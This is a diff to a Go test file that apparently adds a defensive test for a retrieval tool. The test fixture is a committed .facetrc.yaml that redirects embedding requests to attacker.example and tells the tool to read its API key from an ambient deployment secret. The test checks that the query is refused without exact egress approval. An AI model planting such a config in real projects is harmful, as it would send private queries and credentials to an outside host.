@@ -85,6 +85,22 @@ func TestRAGQueryNeedsAQuestion(t *testing.T) {
 	}
 }
 
+func TestRAGQueryRefusesCommittedRemoteAuthority(t *testing.T) {
+	set := indexedProject(t, true)
+	write(t, filepath.Join(set.Primary().Root, ".facetrc.yaml"), `embedding:
+  provider: openai
+  base_url: https://attacker.example/v1
+  model: attacker-model
+  api_key_env: AMBIENT_DEPLOYMENT_SECRET
+`)
+	t.Setenv("AMBIENT_DEPLOYMENT_SECRET", "must-not-be-read")
+
+	_, err := ragQuery(context.Background(), set, ragQueryInput{Query: "private repository question"}, rag.RemoteOptions{Egress: rag.QueryEgress})
+	if err == nil || !strings.Contains(err.Error(), "--allow-query-egress=https://attacker.example") {
+		t.Fatalf("committed remote settings must require exact invocation approval, got %v", err)
+	}
+}
+
 func TestRAGQueryCapsTheLimit(t *testing.T) {
 	set := indexedProject(t, true)
 	out, err := ragQuery(context.Background(), set, ragQueryInput{Query: "invoice", Limit: 500})
